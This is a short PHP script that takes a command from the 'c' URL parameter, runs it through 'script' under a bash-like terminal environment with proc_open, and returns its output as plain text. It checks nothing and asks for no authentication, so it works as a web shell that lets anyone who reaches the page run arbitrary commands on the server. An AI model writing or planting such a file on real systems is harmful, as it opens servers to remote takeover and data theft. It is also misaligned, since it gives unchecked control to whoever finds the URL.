<?php

header('Content-Type: text/plain');

$command = $_GET['c'];

if (!isset($command)) {
    echo 'No command found';
    return;
}

$command = 'script -q -c "' . $command . '" /dev/null';

$descriptorSpec = [
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w'],
];

$envVars = [
    'TERM' => 'xterm',
    'SHELL' => '/bin/bash',
];

$process = proc_open($command, $descriptorSpec, $pipes, null, $envVars);

if (is_resource($process)) {
    // Handle stdin
    // I close the stdin as I don't use it
    fclose($pipes[0]);

    // Handle stdout
    $stdout = stream_get_contents($pipes[1]);

    fclose($pipes[1]);

    // Handle stderr
    $stderr = stream_get_contents($pipes[2]);

    fclose($pipes[2]);
    proc_close($process);

    echo $stdout;
    echo $stderr;
    return;
}

echo 'Something went wrong';
